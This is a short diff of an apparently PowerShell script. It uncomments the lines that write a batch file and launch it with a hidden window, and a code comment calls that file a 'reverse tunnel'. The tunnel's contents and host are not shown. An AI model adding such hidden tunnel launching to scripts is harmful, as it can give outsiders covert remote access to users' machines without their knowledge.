@@ -165,10 +165,10 @@ if %%ERRORLEVEL%% EQU 0 (
 
 
 # Save the batch file
-#Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
+Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII
 
 # Run the reverse tunnel .bat file now (optional: comment out if you don't want it to start immediately)
-#Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
+Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
 #Start-Process -FilePath "$batFilePath"
 
 # Try running the powershell command directly
